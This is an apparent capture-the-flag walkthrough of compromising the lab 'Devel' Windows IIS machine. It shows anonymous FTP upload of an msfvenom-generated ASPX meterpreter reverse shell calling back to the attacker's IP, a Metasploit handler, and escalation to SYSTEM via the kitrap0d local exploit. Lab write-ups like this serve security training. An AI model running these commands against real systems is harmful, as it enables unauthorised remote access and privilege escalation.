Firstly we begin with our NMAP scan. From our scan results we see that ports 21 (ftp) & 80 (http) are open. My first obvservation is that anonymous login is permitted on the FTP server.

![nmap-scan-results](/assets/img/devel/devel-nmap.png)

Before attempting to connect to FTP, I'd like to take a look at what the web server on port 80 is serving up so in a browser I navigate to "http://10.10.10.5".

 We see a default webpage for IIS Microsoft webserver. To save time I'll skip the step of running Dirbuster, which I would normally do at this point to see if I could bruteforce any hidden directories.

![iis-webpage](/assets/img/devel/iis7.png)

As the FTP server allows for anonymous login, I test it to see if we can get access. The anonymous login is successfull. We'll be using it to upload a malicious file. The malicious file will be a reverse shell that we'll be connecting to via Metasploit.

![ftp-connect](/assets/img/devel/ftp-in.png)

The snippet we need to generate our malicious file can be found here "https://mytrickstuff.com/hacks-and-tricks/msfvenom-cheat-sheet-one-page-one-code/". As we're dealing with a Microsoft webserver we need to locate the payload for the file type of ASP. ```msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp```. 

![msfvenom-cheatsheet](/assets/img/devel/cheatsheet.png)

Enter the snippet for ```msfvenom``` to build the file. Add your ```tun0``` IP to ```LHOST```. I changed the file extension to ASPX, but either ASP or ASPX will work.

Make sure the file extension in the command and the extension of the file your putting it in are the same. This will take a few seconds to generate. ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f aspx > ex.aspx```.

![venom-snippet](/assets/img/devel/venom.png)

We fire up Metasploit using ```msfconsole``` and enter ```use exploit/multi/handler``` to begin opening up a listener. This is what our malicious file will connect back to once we have uploaded it to the FTP server and triggered it via a browser.

![setup-listener](/assets/img/devel/use-multi-handler.png)

We need to reconfigure the options. This requires setting the payload to the same as we used for the malicious reverse shell file we generated with ```msfvenom```. We also need to set the ```LHOST``` to the same IP as we used, which is the IP of our ```tun0``` network interface. We enter ```run``` to start the listener.

![run-listener](/assets/img/devel/set-options-run.png)

Now we need to upload our malicious file. We connect to the FTP server with ```ftp 10.10.10.5```

![ftp-connect](/assets/img/devel/ftp-in.png)

And upload our file to the server with ```put ex.aspx```. You can use the ```ls``` command to list out the files on the FTP server to confirm the ```ex.apsx``` has uploaded.

![upload-executable](/assets/img/devel/put-ex.png)

To execute the file we navigate to the url of the web server and append the file name ```http://10.10.10.5/ex.aspx```. This triggers the reverse shell. We return back to the listener session and see wee have a ```meterpreter``` session. However after typing ```getuid``` we see we have low level privilges. We need to escalate our privileges.

![get-user-id](/assets/img/devel/run-getuid.png)

For the moment we background the session.

![background-session](/assets/img/devel/bg-session.png)

In Metasploit we ```search suggester``` for a post module that will escalate our privileges. It returns one post exploit module.

![post-module-suggester](/assets/img/devel/suggester-results.png)

We ```use post/multi/recon/local_exploit_suggester```. Then set the ```options```. We only need to specify the session that we want, that's the session of the reverse shell we have with the FTP server. You can find the session number from when we ran ```background```.

![run-suggester](/assets/img/devel/use-set-run.png)

The suggester returns some possible exploits. In this instance we want to use the ```kitrap0d``` exploit. We ```use exploit/windows/local/ms10_015_kitrap0d```

![suggester-results](/assets/img/devel/suggest-results.png)

We look at the options.

![kitrap0d-exploit](/assets/img/devel/kitra-options.png)

We ```set session 2```, ```set LHOST 10.10.16.3```, and ```set LPORT 4445```. Be sure to use your ```tun0``` IP, as the exploit will have defaulted to your ```eth0``` address. And as we're already using port 4445, we want to use another port.

![set-options](/assets/img/devel/kitra-set.png)

We ```run``` the exploit, type ```getuid```, and see we now have ```AUTHORITY/SYSTEM```. This system has been owned!

![run-exploit](/assets/img/devel/kitra-run.png)

With ```search -f user.txt.txt``` and ```search -f root.txt``` you can locate the flags to fully own the system :)
